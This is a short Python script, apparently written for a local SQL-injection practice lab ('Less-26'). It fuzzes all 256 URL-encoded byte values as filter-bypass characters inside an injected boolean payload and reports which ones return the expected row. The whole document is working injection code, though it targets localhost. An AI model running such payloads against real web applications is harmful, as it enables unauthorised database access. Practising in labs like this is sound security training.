import requests

req = requests.session()

def changeToHex(n):
    t = hex(n).replace("0x","")
    if len(t) < 2:
        t = "0"+t
    return "%" + t

for i in range(0,256):
    i = changeToHex(i)
    # print(i)
    url = "http://127.0.0.1/sql/Less-26/?id=1'" + i + "%26%26" + i + "'1'='1"
    # print(url)
    res = req.get(url)
    if "Dumb".encode() in res.content:
        print("=> "+i)
